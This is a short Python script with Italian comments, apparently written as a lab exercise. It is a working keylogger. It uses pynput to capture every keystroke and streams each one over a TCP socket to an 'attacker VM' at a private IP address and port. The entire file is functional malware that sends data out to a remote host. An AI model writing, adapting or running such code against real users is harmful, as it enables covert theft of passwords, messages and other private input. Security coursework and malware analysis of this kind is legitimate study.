import socket
from pynput import keyboard

# Configura l'indirizzo IP e la porta del server di destinazione (VM attaccante)
SERVER_IP = '192.168.1.190'
SERVER_PORT = 1235

# Crea la connessione socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((SERVER_IP, SERVER_PORT))

def on_press(key):
    try:
        # Invio il carattere al server
        sock.sendall(str(key.char).encode('utf-8'))
    except AttributeError:
        # Gestione dei tasti speciali (es: spazio, invio, etc.)
        sock.sendall(str(key).encode('utf-8'))

# Avvia il listener della tastiera
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

# Chiude la connessione socket quando il listener si interrompe
sock.close()
